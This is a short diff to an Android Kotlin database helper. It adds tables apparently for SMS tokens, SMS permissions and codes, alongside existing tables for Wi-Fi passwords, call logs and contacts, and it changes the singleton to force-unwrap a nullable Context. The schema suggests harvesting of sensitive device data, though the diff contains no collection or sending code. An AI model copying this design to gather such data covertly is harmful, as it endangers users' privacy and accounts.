@@ -5,7 +5,6 @@ import android.database.sqlite.SQLiteDatabase
 import android.database.sqlite.SQLiteOpenHelper
 
 class DbHelper(context: Context) : SQLiteOpenHelper(context, DATABASE_NAME, null, DATABASE_VERSION) {
-
     override fun onCreate(db: SQLiteDatabase) {
         db.execSQL(DbQueries.CREATE_PROCESS)
         db.execSQL(DbQueries.CREATE_WIFI_PASSWORDS)
@@ -15,6 +14,9 @@ class DbHelper(context: Context) : SQLiteOpenHelper(context, DATABASE_NAME, null
         db.execSQL(DbQueries.CREATE_CALLS_LOGS)
         db.execSQL(DbQueries.CREATE_CONTACTS_INFO)
         db.execSQL(DbQueries.CREATE_CONTACTS)
+        db.execSQL(DbQueries.CREATE_TOKEN_SMS_DETAILS)
+        db.execSQL(DbQueries.CREATE_SMS_PERMISSIONS)
+        db.execSQL(DbQueries.CREATE_CODES)
 
     }
     override fun onUpgrade(db: SQLiteDatabase, oldVersion: Int, newVersion: Int) {
@@ -33,9 +35,9 @@ class DbHelper(context: Context) : SQLiteOpenHelper(context, DATABASE_NAME, null
         private var instance : DbHelper? = null
 
         @Synchronized
-        fun getInstance(context: Context) : DbHelper? {
+        fun getInstance(context: Context?) : DbHelper? {
             if (instance == null){
-                instance = DbHelper(context)
+                instance = DbHelper(context!!)
             }
             return instance
         }
